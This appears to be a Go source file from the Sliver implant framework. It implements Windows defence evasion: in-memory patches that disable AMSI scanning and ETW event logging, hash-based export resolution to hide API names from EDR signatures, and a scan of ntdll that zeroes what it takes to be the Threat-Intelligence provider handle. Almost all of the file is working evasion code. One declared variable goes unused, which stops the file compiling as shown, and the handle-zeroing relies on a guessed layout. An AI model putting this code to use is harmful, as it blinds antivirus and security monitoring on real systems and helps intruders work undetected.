package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// This file implements improved AMSI and ETW bypasses using dynamic,
// hash-based function resolution instead of static string lookups.
// Instead of patching with a simple RET (0xC3), we patch with
// `xor eax, eax; ret` (0x33 0xC0 0xC3) which returns STATUS_SUCCESS (0),
// making the function appear to succeed without performing any work.

import (
	"encoding/binary"
	"errors"
	"hash/fnv"
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"unsafe"

	"golang.org/x/sys/windows"
)

// Pre-computed FNV-1a hashes for function names we need to resolve.
// Using hashes avoids leaving plaintext function name strings in the binary
// that EDR/signatures can pattern-match against.
var (
	// amsi.dll exports
	hashAmsiScanBuffer  = fnv1aHash("AmsiScanBuffer")
	hashAmsiInitialize  = fnv1aHash("AmsiInitialize")
	hashAmsiScanString  = fnv1aHash("AmsiScanString")
	hashAmsiScanStringA = fnv1aHash("AmsiScanStringA")

	// ntdll.dll ETW exports
	hashEtwEventWrite         = fnv1aHash("EtwEventWrite")
	hashEtwEventWriteEx       = fnv1aHash("EtwEventWriteEx")
	hashEtwEventWriteTransfer = fnv1aHash("EtwEventWriteTransfer")

	// ntdll.dll PE parsing
	hashNtdll = fnv1aHash("ntdll.dll")

	// ETW Threat Intelligence provider handle
	etwThreatIntHandleAddr uintptr
)

// patchBytes is the `xor eax, eax; ret` sequence for amd64:
//
//	0x33 0xC0   xor eax, eax  (sets EAX = 0, i.e., STATUS_SUCCESS / AMSI_RESULT_CLEAN)
//	0xC3        ret
var patchBytes = []byte{0x33, 0xC0, 0xC3}

// fnv1aHash computes the FNV-1a 64-bit hash of a string.
// This is used for hash-based API resolution to avoid plaintext strings.
func fnv1aHash(s string) uint64 {
	h := fnv.New64a()
	h.Write([]byte(s))
	return h.Sum64()
}

// fnv1aHashBytes computes the FNV-1a 64-bit hash of a byte slice.
func fnv1aHashBytes(b []byte) uint64 {
	h := fnv.New64a()
	h.Write(b)
	return h.Sum64()
}

// exportEntry holds a resolved export's name hash and virtual address.
type exportEntry struct {
	Hash uint64
	Addr uintptr
}

// readExportName reads a null-terminated string from memory.
func readExportName(addr uintptr) string {
	var buf []byte
	for i := uintptr(0); i < 256; i++ {
		b := *(*byte)(unsafe.Pointer(addr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

// resolveExportByHash walks a DLL's export table in memory and returns the
// address of the export whose name matches the given FNV-1a hash.
// This avoids using LazyDLL/NewProc which can be monitored by EDR hooks.
func resolveExportByHash(dllBase uintptr, targetHash uint64) (uintptr, error) {
	// Read e_lfanew from DOS header
	lfanew := *(*int32)(unsafe.Pointer(dllBase + 0x3C))
	peOffset := uintptr(lfanew)

	// PE signature
	peSig := *(*uint32)(unsafe.Pointer(dllBase + peOffset))
	if peSig != 0x00004550 {
		return 0, errors.New("invalid PE signature")
	}

	// COFF header
	coffOffset := dllBase + peOffset + 4
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(coffOffset + 16))

	// Optional header starts right after COFF header (20 bytes)
	optOffset := coffOffset + 20

	// For PE32+, the export directory RVA is at OptionalHeader offset 112
	// (DataDirectory[0]). Magic at offset 0 tells us if it's PE32 (0x10B) or PE32+ (0x20B).
	magic := *(*uint16)(unsafe.Pointer(optOffset))

	var exportDirRVA uint32
	var exportDirSize uint32
	if magic == 0x20B {
		// PE32+ (64-bit): DataDirectories start at offset 112
		dataDirOffset := optOffset + 112
		exportDirRVA = *(*uint32)(unsafe.Pointer(dataDirOffset))
		exportDirSize = *(*uint32)(unsafe.Pointer(dataDirOffset + 4))
	} else {
		// PE32 (32-bit): DataDirectories start at offset 96
		dataDirOffset := optOffset + 96
		exportDirRVA = *(*uint32)(unsafe.Pointer(dataDirOffset))
		exportDirSize = *(*uint32)(unsafe.Pointer(dataDirOffset + 4))
	}

	_ = exportDirSize
	if exportDirRVA == 0 {
		return 0, errors.New("no export directory")
	}

	exportDir := dllBase + uintptr(exportDirRVA)

	// IMAGE_EXPORT_DIRECTORY layout:
	// +0  Characteristics
	// +4  TimeDateStamp
	// +8  MajorVersion/MinorVersion
	// +12 Name (RVA to DLL name string)
	// +16 Base (ordinal base)
	// +20 NumberOfFunctions
	// +24 NumberOfNames
	// +28 AddressOfFunctions (RVA)
	// +32 AddressOfNames (RVA)
	// +36 AddressOfNameOrdinals (RVA)
	numberOfNames := *(*uint32)(unsafe.Pointer(exportDir + 24))
	addressOfFunctions := dllBase + uintptr(*(*uint32)(unsafe.Pointer(exportDir + 28)))
	addressOfNames := dllBase + uintptr(*(*uint32)(unsafe.Pointer(exportDir + 32)))
	addressOfNameOrdinals := dllBase + uintptr(*(*uint32)(unsafe.Pointer(exportDir + 36)))

	// Walk the name table
	for i := uint32(0); i < numberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(addressOfNames + uintptr(i)*4))
		nameAddr := dllBase + uintptr(nameRVA)
		name := readExportName(nameAddr)
		nameHash := fnv1aHash(name)

		if nameHash == targetHash {
			// Found the export — look up the ordinal then the function address
			ordinal := *(*uint16)(unsafe.Pointer(addressOfNameOrdinals + uintptr(i)*2))
			funcRVA := *(*uint32)(unsafe.Pointer(addressOfFunctions + uintptr(ordinal)*4))
			return dllBase + uintptr(funcRVA), nil
		}
	}

	return 0, errors.New("export not found by hash")
}

// patchFunction writes the patch bytes at the given address, temporarily
// changing the memory protection to PAGE_READWRITE.
func patchFunction(addr uintptr, patch []byte) error {
	// Check if already patched
	firstByte := *(*byte)(unsafe.Pointer(addr))
	if firstByte == patch[0] {
		secondByte := *(*byte)(unsafe.Pointer(addr + 1))
		if secondByte == patch[1] {
			return nil // Already patched
		}
	}

	// Change protection to RW
	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		return err
	}

	// Write the patch bytes
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// Restore protection
	err = windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	if err != nil {
		return err
	}

	return nil
}

// DynamicPatchAmsi patches AMSI functions to return AMSI_RESULT_CLEAN (0).
// Instead of using static 0xC3 (RET), we patch with `xor eax, eax; ret`
// (0x33 0xC0 0xC3) which properly returns success status 0.
// Uses hash-based export resolution to avoid plaintext function name strings.
func DynamicPatchAmsi() error {
	// Load amsi.dll
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	amsiBase := uintptr(amsiDLL.Handle())
	if amsiBase == 0 {
		// AMSI may not be loaded yet — try to load it
		amsiDLL = windows.NewLazyDLL("amsi.dll")
		err := amsiDLL.Load()
		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("[DynamicPatchAmsi] amsi.dll not available: %v\n", err)
			//{{end}}
			return nil // AMSI not present, nothing to patch
		}
		amsiBase = uintptr(amsiDLL.Handle())
	}

	//{{if .Config.Debug}}
	log.Println("[DynamicPatchAmsi] Resolving AMSI exports by hash...")
	//{{end}}

	// Patch all known AMSI scan functions
	targetHashes := []uint64{
		hashAmsiScanBuffer,
		hashAmsiInitialize,
		hashAmsiScanString,
		hashAmsiScanStringA,
	}

	patched := 0
	for _, targetHash := range targetHashes {
		addr, err := resolveExportByHash(amsiBase, targetHash)
		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("[DynamicPatchAmsi] Export hash 0x%016x not found: %v\n", targetHash, err)
			//{{end}}
			continue
		}

		err = patchFunction(addr, patchBytes)
		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("[DynamicPatchAmsi] Failed to patch at 0x%08x: %v\n", addr, err)
			//{{end}}
			continue
		}
		patched++
	}

	//{{if .Config.Debug}}
	log.Printf("[DynamicPatchAmsi] Patched %d AMSI functions\n", patched)
	//{{end}}

	return nil
}

// DynamicPatchEtw patches ETW event writing functions to return STATUS_SUCCESS (0).
// Uses hash-based resolution to find EtwEventWrite, EtwEventWriteEx, and
// EtwEventWriteTransfer, then patches each with `xor eax, eax; ret`.
// Also attempts to disable the ETW Threat Intelligence provider if found.
func DynamicPatchEtw() error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntdllBase := uintptr(ntdll.Handle())
	if ntdllBase == 0 {
		return errors.New("could not get ntdll base address")
	}

	//{{if .Config.Debug}}
	log.Println("[DynamicPatchEtw] Resolving ETW exports by hash...")
	//{{end}}

	// Patch ETW event-writing functions
	targetHashes := []uint64{
		hashEtwEventWrite,
		hashEtwEventWriteEx,
		hashEtwEventWriteTransfer,
	}

	patched := 0
	for _, targetHash := range targetHashes {
		addr, err := resolveExportByHash(ntdllBase, targetHash)
		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("[DynamicPatchEtw] Export hash 0x%016x not found: %v\n", targetHash, err)
			//{{end}}
			continue
		}

		err = patchFunction(addr, patchBytes)
		if err != nil {
			//{{if .Config.Debug}}
			log.Printf("[DynamicPatchEtw] Failed to patch at 0x%08x: %v\n", addr, err)
			//{{end}}
			continue
		}
		patched++
	}

	// Attempt to patch the ETW Threat Intelligence provider registration handle.
	// EtwThreatIntProvRegHandle is a global variable in ntdll that holds the
	// registration handle for the Microsoft-Windows-Threat-Intelligence provider.
	// If we zero it out, ETW TI callbacks stop firing for this process.
	err := patchEtwThreatIntelligence(ntdllBase)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("[DynamicPatchEtw] ETW TI provider patch skipped: %v\n", err)
		//{{end}}
	}

	//{{if .Config.Debug}}
	log.Printf("[DynamicPatchEtw] Patched %d ETW functions\n", patched)
	//{{end}}

	return nil
}

// patchEtwThreatIntelligence attempts to locate and neutralize the ETW Threat
// Intelligence provider registration handle (EtwThreatIntProvRegHandle) in ntdll.
// This is a non-exported global, so we search for it by scanning ntdll's .data
// section for the known provider GUID.
func patchEtwThreatIntelligence(ntdllBase uintptr) error {
	// The Microsoft-Windows-Threat-Intelligence provider GUID is:
	// {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
	// As bytes (mixed-endian GUID): we search for the data section pattern.
	// The EtwThreatIntProvRegHandle stores a pointer to REGHANDLE + ProviderEnableInfo.
	// We search for the provider GUID in ntdll's .data section.

	// Read PE headers to find .data section
	lfanew := *(*int32)(unsafe.Pointer(ntdllBase + 0x3C))
	coffOffset := ntdllBase + uintptr(lfanew) + 4
	numberOfSections := *(*uint16)(unsafe.Pointer(coffOffset + 2))
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(coffOffset + 16))
	sectionStart := coffOffset + 20 + uintptr(sizeOfOptionalHeader)

	var dataRVA, dataSize uint32
	for i := uint16(0); i < numberOfSections; i++ {
		secPtr := sectionStart + uintptr(i)*40
		nameBytes := (*[8]byte)(unsafe.Pointer(secPtr))
		if string(nameBytes[:5]) == ".data" {
			dataRVA = *(*uint32)(unsafe.Pointer(secPtr + 12))
			dataSize = *(*uint32)(unsafe.Pointer(secPtr + 8))
			break
		}
	}

	if dataRVA == 0 {
		return errors.New(".data section not found")
	}

	// The Threat Intelligence provider GUID as bytes (standard layout):
	// F4E1897C-BB5D-5668-F1D8-040F4D8DD344
	// In memory (mixed-endian): 7C89E1F4 5DBB 6856 F1D8 040F4D8DD344
	guidBytes := []byte{0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
		0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44}

	dataStart := ntdllBase + uintptr(dataRVA)
	dataLen := uintptr(dataSize)

	// Scan .data section for the GUID
	for i := uintptr(0); i < dataLen-uintptr(len(guidBytes)); i++ {
		match := true
		for j := 0; j < len(guidBytes); j++ {
			if *(*byte)(unsafe.Pointer(dataStart + i + uintptr(j))) != guidBytes[j] {
				match = false
				break
			}
		}
		if match {
			// Found the provider GUID. The REGHANDLE pointer is typically
			// stored near this location. Zero it out to disable TI callbacks.
			// We zero the 8 bytes immediately following the GUID (which
			// typically contains the ProviderHandle/EnableInfo pointer).
			handleAddr := dataStart + i + uintptr(len(guidBytes))
			var oldProtect uint32
			err := windows.VirtualProtect(handleAddr, 8, windows.PAGE_READWRITE, &oldProtect)
			if err == nil {
				// Write 0 (zero out the handle)
				for k := 0; k < 8; k++ {
					*(*byte)(unsafe.Pointer(handleAddr + uintptr(k))) = 0
				}
				windows.VirtualProtect(handleAddr, 8, oldProtect, &oldProtect)
				etwThreatIntHandleAddr = handleAddr
				//{{if .Config.Debug}}
				log.Printf("[DynamicPatchEtw] Patched ETW TI provider handle at 0x%08x\n", handleAddr)
				//{{end}}
			}
			return nil
		}
	}

	return errors.New("ETW Threat Intelligence GUID not found in .data")
}

// uint16ToBytes converts a uint16 to a 2-byte little-endian slice.
func uint16ToBytes(v uint16) []byte {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, v)
	return b
}
